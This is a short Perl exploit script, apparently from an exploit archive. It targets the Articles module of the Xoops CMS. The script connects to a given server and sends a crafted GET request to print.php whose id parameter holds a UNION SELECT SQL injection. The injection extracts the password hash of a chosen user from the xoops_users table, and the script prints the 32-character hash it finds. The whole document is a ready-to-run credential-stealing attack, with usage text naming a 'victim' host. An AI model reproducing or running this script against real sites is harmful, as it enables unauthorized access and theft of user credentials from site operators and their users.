#!/usr/bin/perl -w

#############################################
#Exploit Coded By UNIQUE-KEY[UNIQUE-CRACKER]#
#############################################

use IO::Socket;

if (@ARGV != 3)
{
    print "\n-----------------------------------\n";
    print "Xoops All Version -Articles- Print.PHP (ID) Blind SQL Injection Exploit\n";
    print "-----------------------------------\n";
    print "\nUniquE-Key{UniquE-Cracker}\n";
    print "UniquE[at]UniquE-Key.ORG\n";
    print "http://UniquE-Key.ORG\n";
    print "\n-----------------------------------\n";
    print "\nUsage: $0 <server> <path> <uid>\n";
    print "Examp: $0 www.victim.com /path 1\n";
    print "\n-----------------------------------\n";
    exit ();
}

$server = $ARGV[0];
$path = $ARGV[1];
$uid = $ARGV[2];

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server",  PeerPort => "80");
printf $socket ("GET
%s/modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
L/**/FROM/**/xoops_users/**/WHERE/**/uid=$uid/* HTTP/1.0\nHost: %s\nAccept: */*\nConnection: 
close\n\n",
$path,$server,$uid);

while(<$socket>)

{
    if (/\>(\w{32})\</) { print "\nID '$uid' User Password :\n\n$1\n"; }
}

